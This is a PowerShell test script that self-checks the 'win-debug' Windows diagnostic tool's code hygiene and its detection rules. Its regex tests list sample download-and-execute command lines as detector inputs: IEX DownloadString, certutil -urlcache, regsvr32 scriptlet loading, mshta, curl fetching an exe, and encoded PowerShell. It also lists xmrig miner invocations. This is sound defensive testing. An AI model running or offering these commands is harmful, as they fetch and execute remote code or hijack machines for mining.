# tests\Invoke-Checks.ps1 - repository self-check for win-debug (no Pester dependency).
# Checks: (a) every .ps1 parses, (b) UTF-8 BOM + CRLF for .ps1/.cs and ASCII + CRLF + no BOM for .cmd/.bat,
#         (c) no command aliases in any .ps1, (d) approved verbs for every function, (e) banned APIs
#         (Get-WmiObject, Win32_Product, Get-Counter) and Write-Output used for UI text,
#         (f) source hygiene: Write-Log level literals, no bare powershell.exe invocation, no references to the
#             retired spec file (docs/ARCHITECTURE.md is the reference document),
#         (f2) a function whose param() names and locally assigned variable names differ only by case ($Files vs
#             $files: PowerShell treats them as one variable, so the assignment silently overwrites the parameter),
#         (f3) rule-id reconciliation: every literal -RuleId in lib\*.ps1 is documented in docs\inventory-rules.md or
#             docs\analyze-scoring.md (failure), and every id documented there is still used (reported as a warning),
#         (g) behaviour of lib\Common.ps1 helpers (rule regexes, location class, Win32 argument quoting through a
#             real powershell.exe child, CSV formula guard, -Columns schema, bigint JSON, Write-Log never throws,
#             Get-WinEventSafe under a Russian UI culture and for the Security log, admin skips vs collection errors,
#             Invoke-Safely message cap, Hide-WdSecret, the privacy line of Get-RunInfoSectionLines),
#         (h) entry-point exit codes (skipped when the repository is on a UNC path: WinDebug.ps1 refuses those).
# Exit code 1 when any check fails. Run from anywhere: -Path defaults to the repository root (parent of tests).
# Temporary files go to %TEMP%\wd-selfcheck-<guid> and are removed afterwards; nothing is written into the repo.
[CmdletBinding()]
param(
    [string]$Path
)

Set-StrictMode -Off
$ErrorActionPreference = 'Stop'

if ([string]::IsNullOrWhiteSpace($Path)) {
    $Path = Split-Path -Parent $PSScriptRoot
}
$Path = [IO.Path]::GetFullPath($Path)
if (-not [IO.Directory]::Exists($Path)) {
    Write-Host ('Path not found: {0}' -f $Path) -ForegroundColor Red
    exit 1
}

$excludeDirs = @('.git', 'reports', 'node_modules')
$failures = New-Object 'System.Collections.Generic.List[object]'
$summary  = New-Object 'System.Collections.Generic.List[object]'

function Add-CheckFailure {
    [CmdletBinding()]
    param([string]$Check, [string]$File, [string]$Detail)
    $failures.Add([pscustomobject]@{ Check = $Check; File = $File; Detail = $Detail })
}

function Get-RepoFiles {
    [CmdletBinding()]
    param([string]$Root, [string[]]$Extensions)
    $result = New-Object 'System.Collections.Generic.List[object]'
    $all = @(Get-ChildItem -LiteralPath $Root -Recurse -File -Force -ErrorAction SilentlyContinue)
    foreach ($f in $all) {
        $rel = $f.FullName.Substring($Root.Length).TrimStart('\')
        $skip = $false
        foreach ($ex in $excludeDirs) {
            if ($rel -like ($ex + '\*') -or $rel -like ('*\' + $ex + '\*')) { $skip = $true; break }
        }
        if ($skip) { continue }
        if ($Extensions -contains $f.Extension.ToLowerInvariant()) { $result.Add($f) }
    }
    return $result.ToArray()   # enumerate: callers wrap in @(...)
}

function Test-HasBom {
    [CmdletBinding()]
    param([byte[]]$Bytes)
    return ($Bytes.Length -ge 3 -and $Bytes[0] -eq 0xEF -and $Bytes[1] -eq 0xBB -and $Bytes[2] -eq 0xBF)
}

function Test-CrlfOnly {
    [CmdletBinding()]
    param([byte[]]$Bytes)
    # Every LF (0x0A) must be preceded by CR (0x0D); no lone CR either.
    for ($i = 0; $i -lt $Bytes.Length; $i++) {
        if ($Bytes[$i] -eq 0x0A) {
            if ($i -eq 0 -or $Bytes[$i - 1] -ne 0x0D) { return $false }
        } elseif ($Bytes[$i] -eq 0x0D) {
            if ($i -eq ($Bytes.Length - 1) -or $Bytes[$i + 1] -ne 0x0A) { return $false }
        }
    }
    return $true
}

function Test-AsciiOnly {
    [CmdletBinding()]
    param([byte[]]$Bytes)
    foreach ($b in $Bytes) { if ($b -gt 0x7F) { return $false } }
    return $true
}

$ps1Files    = @(Get-RepoFiles -Root $Path -Extensions @('.ps1'))
$csFiles     = @(Get-RepoFiles -Root $Path -Extensions @('.cs'))
$cmdFiles    = @(Get-RepoFiles -Root $Path -Extensions @('.cmd', '.bat'))

Write-Host ('win-debug self-check: {0}' -f $Path) -ForegroundColor Cyan
Write-Host ('  {0} .ps1, {1} .cs, {2} .cmd/.bat files' -f $ps1Files.Count, $csFiles.Count, $cmdFiles.Count)

# ---------------------------------------------------------------------------------------------
# (a) Syntax
# ---------------------------------------------------------------------------------------------
$asts = @{}
$syntaxFailures = 0
foreach ($f in $ps1Files) {
    $tokens = $null
    $errs = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($f.FullName, [ref]$tokens, [ref]$errs)
    if ($null -ne $errs -and $errs.Count -gt 0) {
        $syntaxFailures++
        foreach ($e in $errs) {
            Add-CheckFailure -Check 'Syntax' -File $f.FullName -Detail ('line {0}: {1}' -f $e.Extent.StartLineNumber, $e.Message)
        }
    }
    $asts[$f.FullName] = @{ Ast = $ast; Tokens = $tokens }
}
$summary.Add([pscustomobject]@{ Check = 'Syntax (parser)'; Files = $ps1Files.Count; Failures = $syntaxFailures })

# ---------------------------------------------------------------------------------------------
# (b) Encoding and line endings
# ---------------------------------------------------------------------------------------------
$encFailures = 0
foreach ($f in @($ps1Files + $csFiles)) {
    $bytes = [IO.File]::ReadAllBytes($f.FullName)
    if (-not (Test-HasBom -Bytes $bytes)) { $encFailures++; Add-CheckFailure -Check 'Encoding' -File $f.FullName -Detail 'missing UTF-8 BOM' }
    if (-not (Test-CrlfOnly -Bytes $bytes)) { $encFailures++; Add-CheckFailure -Check 'Encoding' -File $f.FullName -Detail 'line endings are not CRLF' }
}
foreach ($f in $cmdFiles) {
    $bytes = [IO.File]::ReadAllBytes($f.FullName)
    if (Test-HasBom -Bytes $bytes) { $encFailures++; Add-CheckFailure -Check 'Encoding' -File $f.FullName -Detail 'has a BOM (must be plain ASCII)' }
    if (-not (Test-AsciiOnly -Bytes $bytes)) { $encFailures++; Add-CheckFailure -Check 'Encoding' -File $f.FullName -Detail 'contains non-ASCII bytes' }
    if (-not (Test-CrlfOnly -Bytes $bytes)) { $encFailures++; Add-CheckFailure -Check 'Encoding' -File $f.FullName -Detail 'line endings are not CRLF' }
}
$summary.Add([pscustomobject]@{ Check = 'Encoding (BOM/CRLF/ASCII)'; Files = ($ps1Files.Count + $csFiles.Count + $cmdFiles.Count); Failures = $encFailures })

# ---------------------------------------------------------------------------------------------
# Collect functions defined in the repo (they are never aliases)
# ---------------------------------------------------------------------------------------------
$definedFunctions = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
$functionDefs = New-Object 'System.Collections.Generic.List[object]'
foreach ($k in $asts.Keys) {
    $ast = $asts[$k].Ast
    if ($null -eq $ast) { continue }
    $defs = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    foreach ($d in $defs) {
        [void]$definedFunctions.Add($d.Name)
        $functionDefs.Add([pscustomobject]@{ File = $k; Name = $d.Name; Line = $d.Extent.StartLineNumber; Ast = $d })
    }
}

# ---------------------------------------------------------------------------------------------
# (c) Aliases
# ---------------------------------------------------------------------------------------------
$aliasNames = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
foreach ($a in @(Get-Alias)) { [void]$aliasNames.Add($a.Name) }
# Aliases whose name is also a legitimate external command are still aliases inside PowerShell.
$aliasFailures = 0
foreach ($k in $asts.Keys) {
    $ast = $asts[$k].Ast
    if ($null -eq $ast) { continue }
    $cmds = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)
    foreach ($c in $cmds) {
        $name = $c.GetCommandName()
        if ([string]::IsNullOrEmpty($name)) { continue }
        if ($definedFunctions.Contains($name)) { continue }
        if ($aliasNames.Contains($name)) {
            $aliasFailures++
            $target = ''
            try { $target = (Get-Alias -Name $name -ErrorAction Stop).Definition } catch { $target = '?' }
            Add-CheckFailure -Check 'Alias' -File $k -Detail ('line {0}: "{1}" is an alias of {2}' -f $c.Extent.StartLineNumber, $name, $target)
        }
    }
}
$summary.Add([pscustomobject]@{ Check = 'No aliases'; Files = $ps1Files.Count; Failures = $aliasFailures })

# ---------------------------------------------------------------------------------------------
# (d) Approved verbs
# ---------------------------------------------------------------------------------------------
$verbs = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
foreach ($v in @(Get-Verb)) { [void]$verbs.Add($v.Verb) }
$verbFailures = 0
foreach ($fd in $functionDefs) {
    $idx = $fd.Name.IndexOf('-')
    if ($idx -lt 1) {
        $verbFailures++
        Add-CheckFailure -Check 'Verb' -File $fd.File -Detail ('line {0}: function "{1}" has no Verb-Noun name' -f $fd.Line, $fd.Name)
        continue
    }
    $verb = $fd.Name.Substring(0, $idx)
    if (-not $verbs.Contains($verb)) {
        $verbFailures++
        Add-CheckFailure -Check 'Verb' -File $fd.File -Detail ('line {0}: function "{1}" uses unapproved verb "{2}"' -f $fd.Line, $fd.Name, $verb)
    }
}
$summary.Add([pscustomobject]@{ Check = 'Approved verbs'; Files = $functionDefs.Count; Failures = $verbFailures })

# ---------------------------------------------------------------------------------------------
# (e) Banned APIs and Write-Output for UI text
# ---------------------------------------------------------------------------------------------
$bannedCommands = @(('Get-' + 'WmiObject'), ('Get-' + 'Counter'), ('gwmi'))
$bannedClass    = ('Win32_' + 'Product')
$bannedFailures = 0
foreach ($k in $asts.Keys) {
    $ast = $asts[$k].Ast
    $tokens = $asts[$k].Tokens
    if ($null -eq $ast) { continue }
    $cmds = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)
    foreach ($c in $cmds) {
        $name = $c.GetCommandName()
        if ([string]::IsNullOrEmpty($name)) { continue }
        if ($bannedCommands -contains $name) {
            $bannedFailures++
            Add-CheckFailure -Check 'Banned API' -File $k -Detail ('line {0}: {1} is banned (use CIM / registry / .NET)' -f $c.Extent.StartLineNumber, $name)
        }
        if ($name -eq 'Write-Output') {
            # Allowed only for returning data with -NoEnumerate; a literal string argument is UI text.
            $hasNoEnumerate = $false
            $hasLiteral = $false
            foreach ($el in $c.CommandElements) {
                if ($el -is [System.Management.Automation.Language.CommandParameterAst] -and $el.ParameterName -match '^NoEnumerate') { $hasNoEnumerate = $true }
                if ($el -is [System.Management.Automation.Language.StringConstantExpressionAst] -and $el -ne $c.CommandElements[0]) { $hasLiteral = $true }
                if ($el -is [System.Management.Automation.Language.ExpandableStringExpressionAst]) { $hasLiteral = $true }
            }
            if ($hasLiteral -and -not $hasNoEnumerate) {
                $bannedFailures++
                Add-CheckFailure -Check 'Banned API' -File $k -Detail ('line {0}: Write-Output with a string literal (UI text must use Write-Host / Write-Log)' -f $c.Extent.StartLineNumber)
            }
        }
    }
    # Win32_Product anywhere in a non-comment token (string literals included).
    if ($null -ne $tokens) {
        foreach ($t in $tokens) {
            if ($t.Kind -eq 'Comment') { continue }
            if ($t.Text -match [regex]::Escape($bannedClass)) {
                $bannedFailures++
                Add-CheckFailure -Check 'Banned API' -File $k -Detail ('line {0}: {1} is banned (use the Uninstall registry keys)' -f $t.Extent.StartLineNumber, $bannedClass)
            }
        }
    }
}
$summary.Add([pscustomobject]@{ Check = 'Banned APIs'; Files = $ps1Files.Count; Failures = $bannedFailures })

# ---------------------------------------------------------------------------------------------
# (f) Source hygiene: Write-Log levels, bare powershell.exe, references to the retired spec file
# ---------------------------------------------------------------------------------------------
$hygieneFailures = 0
$validLevels = @('Info', 'Warn', 'Error', 'Debug')
$specName = 'SPEC' + '.md'   # built so that this file itself does not trip the check
foreach ($k in $asts.Keys) {
    $ast = $asts[$k].Ast
    $tokens = $asts[$k].Tokens
    if ($null -eq $ast) { continue }
    $cmds = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)
    foreach ($c in $cmds) {
        $name = $c.GetCommandName()
        if ([string]::IsNullOrEmpty($name)) { continue }
        $elements = @($c.CommandElements)
        if ($name -eq 'Write-Log') {
            # A literal -Level must be one of the four levels (Write-Log itself never throws, so typos would only show at runtime).
            for ($i = 0; $i -lt $elements.Count; $i++) {
                $el = $elements[$i]
                if ($el -is [System.Management.Automation.Language.CommandParameterAst] -and $el.ParameterName -eq 'Level') {
                    $valueAst = $el.Argument
                    if ($null -eq $valueAst -and ($i + 1) -lt $elements.Count) { $valueAst = $elements[$i + 1] }
                    if ($valueAst -is [System.Management.Automation.Language.StringConstantExpressionAst] -and -not ($validLevels -contains $valueAst.Value)) {
                        $hygieneFailures++
                        Add-CheckFailure -Check 'Hygiene' -File $k -Detail ('line {0}: Write-Log -Level "{1}" is not one of {2}' -f $c.Extent.StartLineNumber, $valueAst.Value, ($validLevels -join '/'))
                    }
                }
            }
        }
        if ($name -match '^powershell(\.exe)?$') {
            $hygieneFailures++
            Add-CheckFailure -Check 'Hygiene' -File $k -Detail ('line {0}: bare "{1}" invocation (use the fully qualified host path)' -f $c.Extent.StartLineNumber, $name)
        }
        if ($name -eq 'Start-Process' -or $name -eq 'New-ScheduledTaskAction') {
            $wanted = 'FilePath'
            if ($name -eq 'New-ScheduledTaskAction') { $wanted = 'Execute' }
            for ($i = 0; $i -lt $elements.Count; $i++) {
                $el = $elements[$i]
                if ($el -is [System.Management.Automation.Language.CommandParameterAst] -and $el.ParameterName -eq $wanted) {
                    $valueAst = $el.Argument
                    if ($null -eq $valueAst -and ($i + 1) -lt $elements.Count) { $valueAst = $elements[$i + 1] }
                    if ($valueAst -is [System.Management.Automation.Language.StringConstantExpressionAst] -and $valueAst.Value -match '^powershell(\.exe)?$') {
                        $hygieneFailures++
                        Add-CheckFailure -Check 'Hygiene' -File $k -Detail ('line {0}: {1} -{2} "{3}" resolves through PATH; use $PSHOME\powershell.exe' -f $c.Extent.StartLineNumber, $name, $wanted, $valueAst.Value)
                    }
                }
            }
        }
    }
    if ($null -ne $tokens) {
        foreach ($t in $tokens) {
            if ($t.Text -match [regex]::Escape($specName)) {
                $hygieneFailures++
                Add-CheckFailure -Check 'Hygiene' -File $k -Detail ('line {0}: refers to {1}; the reference document is docs/ARCHITECTURE.md' -f $t.Extent.StartLineNumber, $specName)
            }
        }
    }
}
foreach ($f in $cmdFiles) {
    $lineNo = 0
    foreach ($line in [IO.File]::ReadAllLines($f.FullName)) {
        $lineNo++
        if ($line -match '^\s*rem\b') { continue }
        if ($line -match '(^|[\s&|(])powershell(\.exe)?\s') {
            $hygieneFailures++
            Add-CheckFailure -Check 'Hygiene' -File $f.FullName -Detail ('line {0}: bare powershell.exe (cmd.exe resolves it from the current directory first)' -f $lineNo)
        }
    }
}
$summary.Add([pscustomobject]@{ Check = 'Source hygiene'; Files = ($ps1Files.Count + $cmdFiles.Count); Failures = $hygieneFailures })

# ---------------------------------------------------------------------------------------------
# (f2) Parameter / local variable names that differ only by case ($Files vs $files)
# ---------------------------------------------------------------------------------------------
function Test-InsideOwnFunction {
    # $true when $Node belongs to $Function itself and not to a function nested inside it.
    [CmdletBinding()]
    param([System.Management.Automation.Language.Ast]$Node, [System.Management.Automation.Language.FunctionDefinitionAst]$Function)
    $p = $Node.Parent
    while ($null -ne $p) {
        if ($p -eq $Function) { return $true }
        if ($p -is [System.Management.Automation.Language.FunctionDefinitionAst]) { return $false }
        $p = $p.Parent
    }
    return $false
}
$caseFailures = 0
foreach ($fd in $functionDefs) {
    $d = $fd.Ast
    if ($null -eq $d) { continue }
    $params = @()
    if ($null -ne $d.Parameters) { $params = @($d.Parameters) }
    elseif ($null -ne $d.Body -and $null -ne $d.Body.ParamBlock) { $params = @($d.Body.ParamBlock.Parameters) }
    if ($params.Count -eq 0) { continue }
    $paramNames = @()
    foreach ($p in $params) { $paramNames += [string]$p.Name.VariablePath.UserPath }
    # Assigned variables: "$x = ...", "[type]$x = ...", "$x += ...", and foreach ($x in ...) loop variables.
    $assigned = @{}
    $nodes = $d.Body.FindAll({ param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] -or $n -is [System.Management.Automation.Language.ForEachStatementAst] }, $true)
    foreach ($n in $nodes) {
        if (-not (Test-InsideOwnFunction -Node $n -Function $d)) { continue }
        $target = $null
        if ($n -is [System.Management.Automation.Language.ForEachStatementAst]) { $target = $n.Variable }
        else {
            $target = $n.Left
            if ($target -is [System.Management.Automation.Language.ConvertExpressionAst]) { $target = $target.Child }
            if ($target -is [System.Management.Automation.Language.AttributedExpressionAst]) { $target = $target.Child }
        }
        if ($target -isnot [System.Management.Automation.Language.VariableExpressionAst]) { continue }
        $vn = [string]$target.VariablePath.UserPath
        if ($vn.Contains(':')) { continue }   # $script:x / $env:x are a different variable
        if (-not $assigned.ContainsKey($vn)) { $assigned[$vn] = $n.Extent.StartLineNumber }
    }
    foreach ($vn in $assigned.Keys) {
        foreach ($pn in $paramNames) {
            if ($vn -eq $pn -and $vn -cne $pn) {
                $caseFailures++
                Add-CheckFailure -Check 'CaseCollision' -File $fd.File -Detail ('line {0}: function {1} assigns ${2} (line {3}) which differs from parameter ${4} only by case (same variable in PowerShell)' -f $fd.Line, $fd.Name, $vn, $assigned[$vn], $pn)
            }
        }
    }
}
$summary.Add([pscustomobject]@{ Check = 'Param/variable case'; Files = $functionDefs.Count; Failures = $caseFailures })

# ---------------------------------------------------------------------------------------------
# (f3) Rule-id reconciliation: lib\*.ps1 -RuleId literals vs docs\inventory-rules.md / docs\analyze-scoring.md
# ---------------------------------------------------------------------------------------------
$ruleIdFailures = 0
$libRuleIds = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::Ordinal)
$libRoot = [IO.Path]::Combine($Path, 'lib') + '\'
foreach ($k in $asts.Keys) {
    if (-not $k.StartsWith($libRoot, [StringComparison]::OrdinalIgnoreCase)) { continue }
    $ast = $asts[$k].Ast
    if ($null -eq $ast) { continue }
    $cmds = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandParameterAst] -and $n.ParameterName -eq 'RuleId' }, $true)
    foreach ($c in $cmds) {
        $valueAst = $c.Argument
        if ($null -eq $valueAst) {
            $elements = @($c.Parent.CommandElements)
            for ($i = 0; $i -lt $elements.Count - 1; $i++) { if ($elements[$i] -eq $c) { $valueAst = $elements[$i + 1]; break } }
        }
        if ($valueAst -is [System.Management.Automation.Language.StringConstantExpressionAst]) {
            if (-not [string]::IsNullOrEmpty($valueAst.Value)) { [void]$libRuleIds.Add($valueAst.Value) }
        } elseif ($null -ne $valueAst -and $valueAst -isnot [System.Management.Automation.Language.VariableExpressionAst]) {
            # An expression the check cannot follow; documented ids may be missed here.
            Write-Host ('  note: {0} line {1}: -RuleId is not a string literal ({2})' -f $k.Substring($Path.Length).TrimStart('\'), $c.Extent.StartLineNumber, $valueAst.Extent.Text) -ForegroundColor DarkGray
        }
    }
}
$docRuleIds = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::Ordinal)
$ruleDocs = @([IO.Path]::Combine([IO.Path]::Combine($Path, 'docs'), 'inventory-rules.md'), [IO.Path]::Combine([IO.Path]::Combine($Path, 'docs'), 'analyze-scoring.md'))
$idPattern = '[A-Z]{2,5}-[A-Z0-9]+(?:-[A-Z0-9]+)*'
foreach ($doc in $ruleDocs) {
    if (-not [IO.File]::Exists($doc)) {
        $ruleIdFailures++
        Add-CheckFailure -Check 'RuleIds' -File $doc -Detail 'rule documentation file is missing'
        continue
    }
    foreach ($line in [IO.File]::ReadAllLines($doc)) {
        # Table rows whose first cell is the id, and ids quoted in back-ticks anywhere in the text.
        foreach ($m in [regex]::Matches($line, ('^\|\s*(' + $idPattern + ')\s*\|'))) { [void]$docRuleIds.Add($m.Groups[1].Value) }
        foreach ($m in [regex]::Matches($line, ('`(' + $idPattern + ')`'))) { [void]$docRuleIds.Add($m.Groups[1].Value) }
    }
}
$undocumented = @($libRuleIds | Where-Object { -not $docRuleIds.Contains($_) } | Sort-Object)
$stale        = @($docRuleIds | Where-Object { -not $libRuleIds.Contains($_) } | Sort-Object)
if ($undocumented.Count -gt 0) {
    $ruleIdFailures += $undocumented.Count
    Add-CheckFailure -Check 'RuleIds' -File 'docs\inventory-rules.md' -Detail ('{0} rule id(s) used in lib\*.ps1 are not documented: {1}' -f $undocumented.Count, ($undocumented -join ', '))
}
if ($stale.Count -gt 0) {
    Write-Host ('  warning: {0} documented rule id(s) are not used by any lib\*.ps1: {1}' -f $stale.Count, ($stale -join ', ')) -ForegroundColor Yellow
}
Write-Host ('  rule ids: {0} in code, {1} documented, {2} undocumented, {3} stale' -f $libRuleIds.Count, $docRuleIds.Count, $undocumented.Count, $stale.Count) -ForegroundColor DarkGray
$summary.Add([pscustomobject]@{ Check = 'Rule ids documented'; Files = $libRuleIds.Count; Failures = $ruleIdFailures })

# ---------------------------------------------------------------------------------------------
# (g) Behaviour of lib\Common.ps1 helpers
# ---------------------------------------------------------------------------------------------
$script:behaviourFailures = 0
function Assert-Check {
    [CmdletBinding()]
    param([bool]$Condition, [string]$Detail)
    if (-not $Condition) {
        $script:behaviourFailures++
        Add-CheckFailure -Check 'Behaviour' -File 'lib\Common.ps1' -Detail $Detail
    }
}

$tempRoot = [IO.Path]::Combine([IO.Path]::GetTempPath(), ('wd-selfcheck-' + [guid]::NewGuid().ToString('N')))
[void][IO.Directory]::CreateDirectory($tempRoot)
$psExe = [IO.Path]::Combine($PSHOME, 'powershell.exe')
$commonPath = [IO.Path]::Combine([IO.Path]::Combine($Path, 'lib'), 'Common.ps1')
$commonLoaded = $false
try {
    . $commonPath
    Initialize-Common -ToolVersion 'selfcheck'
    $commonLoaded = $true
} catch {
    Assert-Check -Condition $false -Detail ('lib\Common.ps1 could not be loaded: {0}' -f $_.Exception.Message)
}

if ($commonLoaded) {
    # Rule regexes.
    $rx = [string](Get-WinDebugRule -Name 'SuspiciousPathRegex')
    foreach ($p in @('C:\Users\u\AppData\Local\Temp\x.exe', 'C:\Windows\Temp\x.exe', 'C:\Users\u\AppData\Roaming\x.exe', 'C:\ProgramData\Evil\x.exe', 'C:\Users\Public\x.exe', 'C:\Users\u\AppData\Local\Discord\Update.exe', 'C:\Windows\Tasks\x.exe', 'C:\Windows\System32\Tasks\x.exe', 'C:\Windows\System32\spool\drivers\color\x.exe', 'C:\Windows\System32\com\dmp\x.exe', 'C:\Windows\SysWOW64\com\dmp\x.exe', 'C:\Windows\tracing\x.exe', 'C:\Windows\Registration\CRMLog\x.exe')) {
        Assert-Check -Condition ($p -match $rx) -Detail ('SuspiciousPathRegex must match {0}' -f $p)
    }
    foreach ($p in @('C:\Program Files\Common Files\microsoft shared\Templates\x.exe', 'C:\Program Files\Tempo\tempo.exe', 'C:\Users\u\AppData\Local\Microsoft\WindowsApps\x.exe', 'C:\ProgramData\Microsoft\Windows Defender\Platform\x.exe', 'C:\Windows\System32\svchost.exe', 'C:\ProgramDataX\x.exe', 'C:\Users\u\Documents\Temperature\log.exe', 'C:\Windows\System32\Taskschd.dll', 'C:\Windows\TasksX\x.exe', 'C:\Windows\System32\spool\drivers\x64\3\x.dll')) {
        Assert-Check -Condition ($p -notmatch $rx) -Detail ('SuspiciousPathRegex must not match {0}' -f $p)
    }
    $rx = [string](Get-WinDebugRule -Name 'MinerTokenRegex')
    foreach ($p in @('xmrig.exe -o stratum+tcp://pool.example:3333 -u 4ABC', 'miner.exe --url=stratum+ssl://x.y:443', 'app.exe -o stratum://x.y')) {
        Assert-Check -Condition ($p -match $rx) -Detail ('MinerTokenRegex must match {0}' -f $p)
    }
    foreach ($p in @('"C:\Program Files\App\App.exe" --type=renderer --url=https://example.com/page', 'chrome.exe --type=utility --lang=en-US')) {
        Assert-Check -Condition ($p -notmatch $rx) -Detail ('MinerTokenRegex must not match {0}' -f $p)
    }
    $weak   = [string](Get-WinDebugRule -Name 'ScriptHostWeakArgRegex')
    $strong = [string](Get-WinDebugRule -Name 'ScriptHostStrongArgRegex')
    Assert-Check -Condition ([string](Get-WinDebugRule -Name 'ScriptHostArgRegex') -eq $strong) -Detail 'ScriptHostArgRegex must be an alias of ScriptHostStrongArgRegex'
    $weakOnly = 'powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File C:\Tools\backup.ps1'
    Assert-Check -Condition ($weakOnly -match $weak) -Detail 'ScriptHostWeakArgRegex must match -ExecutionPolicy Bypass / -NoProfile / -WindowStyle Hidden'
    Assert-Check -Condition ($weakOnly -notmatch $strong) -Detail 'ScriptHostStrongArgRegex must not match launch options only (Bypass/NoProfile/Hidden)'
    foreach ($p in @('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA', 'powershell -EncodedCommand AAAA', 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x/a'')"', 'certutil -urlcache -split -f http://x/a.exe a.exe', 'regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll', 'mshta https://x/y.hta', 'cmd /c curl -o a.exe http://x/a.exe', 'powershell [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))')) {
        Assert-Check -Condition ($p -match $strong) -Detail ('ScriptHostStrongArgRegex must match {0}' -f $p)
    }
    $rx = [string](Get-WinDebugRule -Name 'TrustedSignerRegex')
    foreach ($s in @('CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US', 'CN=Dell Inc, O=Dell Inc, L=Round Rock, S=Texas, C=US', 'CN="Advanced Micro Devices, Inc.", O="Advanced Micro Devices, Inc.", L=Santa Clara, S=California, C=US', 'CN=Valve, O=Valve Corp., L=Bellevue, S=Washington, C=US', 'CN=Telegram FZ-LLC, O=Telegram FZ-LLC, L=Dubai, C=AE', 'CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US', 'O=Spotify AB, L=Stockholm, C=SE')) {
        Assert-Check -Condition ($s -match $rx) -Detail ('TrustedSignerRegex must match {0}' -f $s)
    }
    foreach ($s in @('CN=Tracer LLC, O=Tracer LLC, C=US', 'CN=Dellwood Games, O=Dellwood Games, C=US', 'CN=Evil Corp, O=Evil Corp, L=Dell, C=US', 'CN=Placer Software Ltd, O=Placer Software Ltd, C=US', 'CN=Savgor Inc, O=Savgor Inc', 'CN=Valvetronic GmbH, O=Valvetronic GmbH, C=DE', 'CN=Reset Tools, O=Reset Tools', 'CN=Microsoft 3rd Party Application Component, O=Microsoft 3rd Party Application Component', 'CN=Dell Inc', 'CN=Legit Unknown Vendor, O=Legit Unknown Vendor')) {
        Assert-Check -Condition ($s -notmatch $rx) -Detail ('TrustedSignerRegex must not match {0}' -f $s)
    }

    # Location class: folder prefixes need their trailing separator.
    $pf = [string]$env:ProgramFiles
    if (-not [string]::IsNullOrEmpty($pf)) {
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pf + '\App\a.exe')) -eq 'ProgramFiles') -Detail 'Get-ProcessLocationClass: <ProgramFiles>\App\a.exe must be ProgramFiles'
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pf + 'Fake\evil.exe')) -ne 'ProgramFiles') -Detail 'Get-ProcessLocationClass: <ProgramFiles>Fake\evil.exe must not be ProgramFiles'
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pf + ' Updates\evil.exe')) -ne 'ProgramFiles') -Detail 'Get-ProcessLocationClass: "<ProgramFiles> Updates\evil.exe" must not be ProgramFiles'
    }
    $pf86 = [string]${env:ProgramFiles(x86)}
    if (-not [string]::IsNullOrEmpty($pf86)) {
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pf86 + '\App\a.exe')) -eq 'ProgramFiles') -Detail 'Get-ProcessLocationClass: <ProgramFiles(x86)>\App\a.exe must be ProgramFiles'
    }
    $pd = [string]$env:ProgramData
    if (-not [string]::IsNullOrEmpty($pd)) {
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pd + '\Vendor\a.exe')) -eq 'ProgramData') -Detail 'Get-ProcessLocationClass: <ProgramData>\Vendor\a.exe must be ProgramData'
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($pd + 'X\evil.exe')) -ne 'ProgramData') -Detail 'Get-ProcessLocationClass: <ProgramData>X\evil.exe must not be ProgramData'
    }
    $win = [string]$env:windir
    if (-not [string]::IsNullOrEmpty($win)) {
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($win + '\System32\svchost.exe')) -eq 'System32') -Detail 'Get-ProcessLocationClass: System32 binary'
        Assert-Check -Condition ((Get-ProcessLocationClass -Path ($win + 'X\evil.exe')) -ne 'Windows') -Detail 'Get-ProcessLocationClass: <windir>X\evil.exe must not be Windows'
    }
    Assert-Check -Condition ((Get-ProcessLocationClass -Path 'C:\Users\Publicity\evil.exe') -eq 'UserProfile') -Detail 'Get-ProcessLocationClass: C:\Users\Publicity\evil.exe must be UserProfile'

    # Win32 argument quoting: round trip through a real powershell.exe child (the same parser the elevated relaunch hits).
    $cyr = -join @([char]0x041E, [char]0x0442, [char]0x0447, [char]0x0451, [char]0x0442, [char]0x044B)   # Cyrillic folder name
    $argCases = @('D:\', 'C:\Tools\reports\', 'C:\Tools\my reports\', ('C:\' + $cyr + '\' + $cyr + '\'), 'C:\we"ird\', 'plain', 'a\\b', 'C:\x\\', 'ends"quote"')
    Assert-Check -Condition ((ConvertTo-CommandLineArgument -Text 'D:\') -eq '"D:\\"') -Detail 'ConvertTo-CommandLineArgument D:\ must give "D:\\"'
    Assert-Check -Condition ((ConvertTo-CommandLineArgument -Text 'C:\we"ird\') -eq '"C:\we\"ird\\"') -Detail 'ConvertTo-CommandLineArgument must escape embedded quotes as \"'
    $stubPath = [IO.Path]::Combine($tempRoot, 'stub.ps1')
    $outPath  = [IO.Path]::Combine($tempRoot, 'args.txt')
    $stub = @(
        'param([string]$Out)',
        '$rest = @($args)',
        '[IO.File]::WriteAllLines($Out, [string[]]$rest, (New-Object System.Text.UTF8Encoding($true)))'
    )
    [IO.File]::WriteAllText($stubPath, (($stub -join "`r`n") + "`r`n"), (New-Object System.Text.UTF8Encoding($true)))
